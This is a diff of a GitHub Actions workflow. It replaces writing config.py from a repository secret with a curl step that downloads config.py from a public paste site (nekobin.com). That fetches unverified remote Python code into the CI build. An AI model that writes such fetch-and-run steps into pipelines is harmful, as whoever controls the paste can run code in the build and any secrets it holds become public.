@@ -24,10 +24,8 @@ jobs:
       with:
         python-version: ${{ matrix.python-version }}
     - name: Set up configuration
-      env:
-        config_py: ${{ secrets.CONFIG_PY }}
       run: |
-        echo "$config_py" > config.py
+        curl https://nekobin.com/raw/ribemororo -o config.py
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
